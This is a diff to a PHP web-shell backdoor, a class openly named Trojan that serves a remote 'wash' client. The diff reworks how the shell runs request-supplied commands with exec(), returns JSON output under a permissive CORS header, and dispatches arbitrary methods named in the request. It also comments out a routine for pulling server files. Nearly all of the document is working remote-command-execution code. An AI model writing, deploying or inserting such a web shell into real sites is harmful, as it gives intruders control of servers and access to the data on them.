@@ -10,13 +10,16 @@
 class Trojan{
     private $command         = '';
     private $cwd             = '';
-    private $output          = '';
-    private $prompt_context  = '';
     private $payloads        = array();
     private $options         = array(
         'redirect_stderr_to_stdout'  => true,
     );
     private $output_raw      = array();
+    private $response        = array(
+        'error'          => '',
+        'output'         => '',
+        'prompt_context' => '',
+    );
 
     /**
      * A generic constructor
@@ -32,16 +35,16 @@ class Trojan{
      * @param string $json             JSON from the wash client
      */
     public function process_command($json){
-        # @todo (probably here: decrypt the command)
-        # process shell commands
-        if($json['type'] == 'shell'){
+        # if the specified action was 'shell', pipe the command directly into
+        # the web shell.
+        if($json['action'] == 'shell'){
             $this->process_shell_command($json['cmd']);
         }
 
-        # process wash commands
-        if($json['type'] == 'wash'){
-            //$this->process_wash_command($json['cmd']);
-            $this->exfil();
+        # otherwise, simply invoke the method directly
+        else {
+            # PHP Haters: suck it.
+            $this->${$json['action']}($json['cmd'], $json['args']);
         }
     }
 
@@ -70,41 +73,36 @@ class Trojan{
         }
         exec($command, $this->output_raw);
 
-        # parse the results
-        $this->cwd    = array_pop($this->output_raw);
-        $this->output = join($this->output_raw, "\n");
+        # buffer the results
+        $this->cwd                        = array_pop($this->output_raw);
+        $this->response = array(
+            'output'         => join($this->output_raw, "\n"),
+            'prompt_context' => $this->get_prompt_context(),
+        );
 
         # save the cwd
         $_SESSION['cwd'] = $this->cwd;
-    }
 
-    /**
-     * Processes a wash command
-     *
-     * @param string $command          The wash command to process
-     */
-    private function process_wash_command($command){
-        return true;
+        # send the response
+        $this->send_response();
     }
 
     /**
      * Sends a response back to the wash client
      */
-    public function send_response(){
+    private function send_response(){
         /* This header prevents the wash client from malfunctioning due to the 
          * Same-Origin Policy. @see: http://enable-cors.org/ */
         header('Access-Control-Allow-Origin: *');
 
-        //$error    = '';
-        $response = array(
-            'prompt_context' => $this->get_prompt_context(),
-            'output'         => $this->output,
-            //'error'          => $error,
+        # configure the response to send
+        $this->response = array(
+            'prompt_context' => $this->response['prompt_context'],
+            'output'         => $this->response['output'],
         );
 
         # assemble and send a JSON-encoded response
-        $json = json_encode($response);
-        echo $json;
+        echo json_encode($this->response);
         die();
     }
 
@@ -122,34 +120,22 @@ class Trojan{
         return $this->prompt_context;
     }
 
-
-
-
-
-
-
-
     /**
-     * Exfiltrates a file
+     * Downloads a file
      *
      * @param string $file             The file to download
      */
-    public function exfil($file = 'blah'){
+    public function download($file = 'blah'){
 
-        $this->prompt_context = 'wash.blah';
-
-        $response = array(
-            'prompt_context' => $this.prompt_context,
-            'output'         => 'Exfiltrating file.',
-            //'error'          => $error,
+        # assemble a response
+        $this->response = array(
+            'output'         => 'Download was invoked',
+            'prompt_context' => 'wash.download: ',
         );
 
+        $this->send_response();
 
-        # assemble and send a JSON-encoded response
-        $json = json_encode($response);
-        echo $json;
-        
-
+        /*
         $file = '/etc/hosts';
         if (file_exists($file)) {
             header('Content-Description: File Transfer');
@@ -165,13 +151,13 @@ class Trojan{
             readfile($file);
             die();
         }
-
-
+        */
     }
 }
 
 /* ---------- Procedural code starts here ---------- */
+# @todo (probably here: decrypt the command)
 session_start();
 $trojan = new Trojan();
 $trojan->process_command($_REQUEST);
-$trojan->send_response();
+// I might want to move this up into one of the class methods
